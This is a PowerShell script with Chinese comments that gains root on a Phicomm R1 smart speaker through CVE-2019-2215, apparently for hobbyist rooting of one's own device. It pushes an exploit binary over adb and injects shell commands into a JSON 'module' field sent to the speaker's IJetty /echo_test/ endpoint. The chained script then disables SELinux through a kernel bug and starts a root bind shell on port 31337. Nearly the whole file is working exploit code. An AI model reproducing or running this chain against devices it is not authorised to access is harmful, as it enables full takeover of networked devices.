<#
.SYNOPSIS
    斐讯 R1 一键获取 root（CVE-2019-2215）

.DESCRIPTION
    1. adb 连接音箱（默认 192.168.123.115:5555）
    2. 推送利用文件并启动 IJetty（uid1000 命令执行通道）
    3. 通过 IJetty 运行 onkey.sh：内核漏洞清零 selinux_enforcing，
       再 setprop ctl.start 让 init 以 root 启动 rootd
    4. 验证 :31337 root shell 是否就绪

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File onkey.ps1
    powershell -ExecutionPolicy Bypass -File onkey.ps1 -Ip 192.168.43.1
#>
param(
    [string]$Ip = "192.168.123.115",
    [int]$Port = 5555,
    [int]$ShellPort = 31337
)

$ErrorActionPreference = "Stop"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$files = Join-Path $here "files"
$dev = "$Ip`:$Port"

function Write-Step($s) { Write-Host "[*] $s" -ForegroundColor Cyan }
function Write-Ok($s)   { Write-Host "[+] $s" -ForegroundColor Green }
function Write-Bad($s)  { Write-Host "[-] $s" -ForegroundColor Red }

Write-Step "adb connect $dev"
adb connect $dev 2>&1 | Out-Null
$state = (adb -s $dev get-state 2>$null)
if ("$state".Trim() -ne "device") {
    Write-Bad "adb 未连接（检查 WiFi / adb tcpip 5555）"
    exit 1
}

Write-Step "推送文件到 /sdcard/r1root"
adb -s $dev shell "mkdir -p /sdcard/r1root" 2>&1 | Out-Null
foreach ($f in @("exp2224", "rootd", "onkey.sh")) {
    $src = if ($f -eq "onkey.sh") { Join-Path $here $f } else { Join-Path $files $f }
    adb -s $dev push $src "/sdcard/r1root/$f" 2>&1 | Out-Null
}

Write-Step "启动 IJetty (:9090)"
adb -s $dev shell am startservice -n com.phicomm.speaker.ijetty/.IJettyService 2>&1 | Out-Null
for ($i = 0; $i -lt 20; $i++) {
    if ((Test-NetConnection -ComputerName $Ip -Port 9090 -WarningAction SilentlyContinue).TcpTestSucceeded) { break }
    Start-Sleep -Milliseconds 500
}

Write-Step "通过 IJetty 以 uid1000 执行一键脚本"
$cmd = "rm -f /data/system/onkey.sh; cp /sdcard/r1root/onkey.sh /data/system/onkey.sh; " +
       "chmod 755 /data/system/onkey.sh; /data/system/onkey.sh /sdcard/r1root $ShellPort 2>&1; " +
       "echo SELINUX=`$(getenforce)"
$payload = @{ module = "zz;$cmd;echo"; test_case = "t"; args = @() } | ConvertTo-Json -Compress
$tmp = Join-Path $env:TEMP "r1onkey.json"
[System.IO.File]::WriteAllText($tmp, $payload, (New-Object System.Text.UTF8Encoding($false)))
$resp = & curl.exe -s -m 120 -X POST -H "Content-Type: application/json" --data "@$tmp" "http://$Ip`:9090/echo_test/"
$resp | Out-String | Write-Host

Write-Step "验证 root shell"
$ok = $false
for ($i = 0; $i -lt 20; $i++) {
    if ((Test-NetConnection -ComputerName $Ip -Port $ShellPort -WarningAction SilentlyContinue).TcpTestSucceeded) { $ok = $true; break }
    Start-Sleep -Milliseconds 500
}

if ($ok) {
    Write-Ok "root shell: $Ip`:$ShellPort  (uid=0)"
    Write-Ok "连接方式: telnet $Ip $ShellPort   (或 rootshell.ps1)"
    Write-Host ""
    Write-Host "  adb shell su   # 若已安装 setuid su（可执行 persist.sh 安装）"
} else {
    Write-Bad "未检测到 :$ShellPort，请查看上面的输出（selinux 是否变为 Permissive）"
    exit 2
}
